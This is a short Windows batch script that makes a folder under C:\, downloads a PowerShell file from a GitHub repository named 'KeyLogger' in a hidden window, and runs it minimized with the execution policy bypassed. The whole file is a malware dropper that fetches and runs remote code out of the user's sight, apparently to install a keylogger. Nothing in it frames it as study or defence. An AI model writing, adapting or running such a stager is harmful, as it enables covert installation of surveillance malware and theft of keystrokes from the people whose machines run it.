@echo off

cd C:\
mkdir script
cd script
powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/test.ps1' -OutFile 'key.ps1'"
start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\key.ps1



